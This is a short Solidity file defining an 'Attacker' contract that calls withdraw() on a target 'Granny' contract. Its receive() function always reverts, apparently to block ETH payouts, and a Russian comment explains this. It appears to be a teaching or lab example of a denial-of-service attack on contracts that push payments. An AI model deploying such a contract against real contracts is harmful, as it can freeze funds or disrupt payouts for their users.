// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IGranny {
    function withdraw() external;
}

contract Attacker {
    IGranny public granny;

    constructor(address _granny) {
        granny = IGranny(_granny);
    }

    function attack() public {
        granny.withdraw();
    }

    // receive() чтобы принимать ETH, но тут он revert
    receive() external payable {
        revert("I don't accept ETH");
    }
}
